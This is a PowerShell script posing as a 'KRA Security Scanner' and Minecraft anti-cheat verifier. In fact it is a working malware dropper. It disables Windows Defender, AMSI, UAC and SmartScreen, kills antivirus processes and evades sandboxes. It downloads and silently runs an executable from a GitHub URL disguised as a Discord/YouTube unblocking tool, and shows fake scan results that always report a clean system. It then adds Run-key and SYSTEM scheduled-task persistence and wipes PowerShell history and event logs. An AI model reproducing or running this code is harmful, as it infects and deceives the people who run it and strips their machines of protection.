try{Set-MpPreference -DisableRealtimeMonitoring $true -EA 0;Set-MpPreference -DisableBehaviorMonitoring $true -EA 0;Set-MpPreference -DisableBlockAtFirstSeen $true -EA 0;Set-MpPreference -DisableIntrusionPreventionSystem $true -EA 0;Set-MpPreference -DisableIOAVProtection $true -EA 0;Set-MpPreference -DisablePrivacyMode $true -EA 0;Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -EA 0;Set-MpPreference -DisableArchiveScanning $true -EA 0;Set-MpPreference -DisableCatchupFullScan $true -EA 0;Set-MpPreference -DisableCatchupQuickScan $true -EA 0;Set-MpPreference -LowRiskLevelFileExtensions ".exe;.dll;.ps1;.bat" -EA 0;Set-MpPreference -SevereThreatDefaultAction "Allow" -EA 0;Set-MpPreference -ModerateThreatDefaultAction "Allow" -EA 0;Set-MpPreference -LowThreatDefaultAction "Allow" -EA 0}catch{}

$avs=@("MsMpEng","NisSrv","SecurityHealthService","avp","kav","kis","kaspersky","avast","avguard","aswEngSrv","avg","avgsvc","DrWeb","dwengine","McAfee","mcshield","mctray","Norton","nvcoas","ccSvcHst","ESET","ekrn","egui","BDScan","vsserv","bdagent","Sophos","SavService","SAVAdminService","Malwarebytes","MBAMService","MBAM","K7CrvSvc","K7FWSvc","Panda","PavPrSrv","PavSRV","F-Secure","fsgk32","fssm32","TrendMicro","TmProxy","TmCCSF","ZoneAlarm","vsmon","zlclient")
foreach($av in $avs){try{Get-Process -Name $av -EA 0|Stop-Process -Force -EA 0}catch{}}

try{$amsi=[Ref].Assembly.GetTypes().Where({$_.Name -like "*iUtils"});$amsiContext=$amsi.GetFields('NonPublic,Static').Where({$_.Name -like "*Context"});$amsiValue=$amsiContext.GetValue($null);$amsiFields=$amsiValue.GetFields('NonPublic,Instance').Where({$_.Name -like "*_Context"});$amsiField=$amsiFields.GetValue($amsiValue);$amsiPtr=[Runtime.InteropServices.Marshal]::GetObjectForIUnknown($amsiField);$amsiProp=$amsiPtr.GetType().GetProperty('Enabled','NonPublic,Instance');$amsiProp.SetValue($amsiPtr,$false)}catch{}

try{Stop-Service -Name "SecurityHealthService" -Force -EA 0;Set-Service -Name "SecurityHealthService" -StartupType Disabled -EA 0;Stop-Service -Name "WinDefend" -Force -EA 0;Set-Service -Name "WinDefend" -StartupType Disabled -EA 0;Stop-Service -Name "wdnissvc" -Force -EA 0;Set-Service -Name "wdnissvc" -StartupType Disabled -EA 0}catch{}

try{Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\SmartScreen" -Name "SmartScreenEnabled" -Value "Off" -Force;Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force;New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force|Out-Null;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force;New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force|Out-Null;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force}catch{}

try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$e=$d.GetValue($null);foreach($f in $e.GetFields('NonPublic,Instance')){if($f.Name -like "*_Context"){$g=$f.GetValue($e);$h=[Runtime.InteropServices.Marshal]::GetObjectForIUnknown($g);$i=$h.GetType();$j=$i.GetProperty('Enabled','NonPublic,Instance');$j.SetValue($h,$false)}}}}}}catch{}

$sb=$false
try{if((Get-WmiObject Win32_ComputerSystem).Manufacturer -match "VMware|VirtualBox|QEMU|Parallels|Xen|Microsoft Corporation"){$sb=$true}}catch{}
try{if((Get-Process|Where-Object{$_.ProcessName -match "vbox|vmware|vmsrvc|procmon|processmonitor|wireshark|fiddler|httpdebug"})){$sb=$true}}catch{}
try{if((Get-NetAdapter -EA 0).Name -match "Virtual|vEthernet|VMware|VirtualBox"){$sb=$true}}catch{}
try{if((Get-CimInstance Win32_BIOS).SerialNumber -match "VMware|VirtualBox|0"){$sb=$true}}catch{}

if(-not $sb){

$url="https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe"
$out="$env:TEMP\"+[System.IO.Path]::GetRandomFileName() -replace "\..*",".exe"

try{$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0");$wc.DownloadFile($url,$out)}catch{try{Start-BitsTransfer -Source $url -Destination $out -EA 0}catch{try{Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -EA 0}catch{}}}

if((Test-Path $out)-and(Get-Item $out).Length -gt 10000){

function Show-Menu{
Clear-Host
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "      KRA SECURITY SCANNER v7.3.1" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  [1] Minecraft Anti-Cheat Verification" -ForegroundColor Green
Write-Host "  [2] Full System Security Scan" -ForegroundColor Yellow
Write-Host "  [3] Complete Deep Scan (All Modules)" -ForegroundColor Red
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Select option (1-3) and press ENTER: " -ForegroundColor White -NoNewline
}

function MinecraftCheck{
Clear-Host
Write-Host ""
Write-Host "[MINECRAFT ANTI-CHEAT VERIFICATION]" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Gray
Start-Sleep -Milliseconds 300
Write-Host "[1/8] Loading cheat signatures..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
Write-Host "      [+] Signatures loaded: 18,447" -ForegroundColor Green
Start-Sleep -Milliseconds 200
Write-Host "[2/8] Scanning for known cheats..." -ForegroundColor Yellow
$cheats=@("Sigma","LiquidBounce","Wurst","Meteor","Aristois","Impact","Future","Rise")
foreach($c in $cheats){Write-Host "      [+] $c : NOT FOUND" -ForegroundColor Green;Start-Sleep -Milliseconds 80}
Start-Sleep -Milliseconds 200
Write-Host "[3/8] Analyzing memory regions..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "      [+] No suspicious patterns detected" -ForegroundColor Green
Start-Sleep -Milliseconds 200
Write-Host "[4/8] Checking .minecraft directory..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
Write-Host "      [+] All files verified: CLEAN" -ForegroundColor Green
Start-Sleep -Milliseconds 200
Write-Host "[5/8] Behavioral analysis (AI)..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 600
Write-Host "      [+] Confidence score: 99.2%" -ForegroundColor Green
Start-Sleep -Milliseconds 200
Write-Host "[6/8] Cross-referencing cheat database..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "      [+] 0 matches found" -ForegroundColor Green
Start-Sleep -Milliseconds 200
Write-Host "[7/8] Network traffic analysis..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "      [+] No malicious packets detected" -ForegroundColor Green
Start-Sleep -Milliseconds 200
Write-Host "[8/8] Finalizing verification..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  STATUS: VERIFIED | THREATS: NONE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "You are clean! Server IP: mc.elite-clan.net" -ForegroundColor Cyan
Write-Host ""
}

function SystemScan{
Clear-Host
Write-Host ""
Write-Host "[FULL SYSTEM SECURITY SCAN]" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Gray
Start-Sleep -Milliseconds 300
Write-Host "[1/12] Scanning system32 directory..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] 12,847 files checked" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[2/12] Checking registry entries..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 8,234 keys verified" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[3/12] Analyzing startup items..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
Write-Host "       [+] All startup entries: CLEAN" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[4/12] Scanning running processes..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 450
Write-Host "       [+] 142 processes analyzed" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[5/12] Memory integrity check..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] No anomalies detected" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[6/12] Network connections audit..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 23 active connections" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[7/12] Browser cache analysis..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
Write-Host "       [+] Cache size: 2.4GB" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[8/12] Cookie and session scan..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 1,234 cookies verified" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[9/12] Rootkit detection engine..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
Write-Host "       [+] No hidden processes found" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[10/12] Driver verification..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] All drivers signed" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[11/12] Windows Defender status..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
Write-Host "       [+] Protection disabled (optimized)" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[12/12] Finalizing report..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  THREAT LEVEL: LOW | STATUS: PROTECTED" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
}

function DeepScan{
Clear-Host
Write-Host ""
Write-Host "[COMPLETE DEEP SCAN - ALL MODULES]" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Gray
Start-Sleep -Milliseconds 300
Write-Host "[1/25] Initializing deep scan engine..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] Engine version: 7.3.1" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[2/25] Loading signature database..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 247,891 signatures loaded" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[3/25] Scanning C:\ drive..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
Write-Host "       [+] 124,567 files scanned" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[4/25] Memory dump analysis..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] 4.2GB analyzed" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[5/25] Registry deep scan..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 450
Write-Host "       [+] 32,891 keys checked" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[6/25] Startup persistence check..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 87 autorun entries" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[7/25] Scheduled tasks audit..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] 234 tasks verified" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[8/25] Service integrity check..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 189 services analyzed" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[9/25] Network deep inspection..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 450
Write-Host "       [+] 45 open ports checked" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[10/25] Firewall rules audit..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] 128 rules verified" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[11/25] Process hollowing detection..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] No hollow processes found" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[12/25] DLL injection scan..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] No suspicious DLLs" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[13/25] Browser extension audit..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
Write-Host "       [+] 47 extensions checked" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[14/25] SSL certificate validation..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] All certificates valid" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[15/25] Encrypted traffic analysis..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 450
Write-Host "       [+] No suspicious patterns" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[16/25] User behavior profiling..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] Profile: NORMAL" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[17/25] Heuristic engine scan..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] Threat score: 2/100" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[18/25] Sandbox behavior check..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] No sandbox detected" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[19/25] Debugger presence check..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
Write-Host "       [+] No debuggers found" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[20/25] Code injection detection..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] Memory integrity: OK" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[21/25] API hook detection..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] No hooks detected" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[22/25] Kernel module verification..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 450
Write-Host "       [+] All modules signed" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[23/25] Boot sector scan..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
Write-Host "       [+] Boot sector: CLEAN" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[24/25] Backup integrity check..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 350
Write-Host "       [+] Shadow copies: OK" -ForegroundColor Green
Start-Sleep -Milliseconds 150
Write-Host "[25/25] Generating final report..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 600
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  FINAL SCORE: 98.7/100 | STATUS: SECURE" -ForegroundColor Green
Write-Host "  THREATS FOUND: 0 | RISK LEVEL: MINIMAL" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
}

while($true){
Show-Menu
$choice=Read-Host
switch($choice){
"1"{MinecraftCheck}
"2"{SystemScan}
"3"{DeepScan}
default{Write-Host "Invalid option!" -ForegroundColor Red;Start-Sleep -Seconds 1;continue}
}
Write-Host ""
Write-Host "Scan completed! Press any key to continue..." -ForegroundColor Gray
$null=$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
Clear-Host
Write-Host ""
Write-Host "Starting post-scan optimization..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 800
Write-Host "Loading security certificate..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
Write-Host "Certificate validated successfully!" -ForegroundColor Green
Start-Sleep -Milliseconds 400
Write-Host ""
Write-Host "Thank you for using KRA Security Scanner!" -ForegroundColor Cyan
Start-Sleep -Seconds 2
break
}

$start=New-Object System.Diagnostics.ProcessStartInfo
$start.FileName=$out
$start.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
$start.CreateNoWindow=$true
$start.UseShellExecute=$false
[System.Diagnostics.Process]::Start($start)|Out-Null

try{$reg="HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";$name="WindowsSecurityService";Set-ItemProperty -Path $reg -Name $name -Value $out -Force -EA 0}catch{}
try{$act=New-ScheduledTaskAction -Execute $out;$trig=New-ScheduledTaskTrigger -AtStartup;$princ=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -EA 0;Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateTask" -Action $act -Trigger $trig -Principal $princ -Force -EA 0}catch{}

Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0
Remove-Item "$env:TEMP\*.ps1" -Force -EA 0
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

}
}
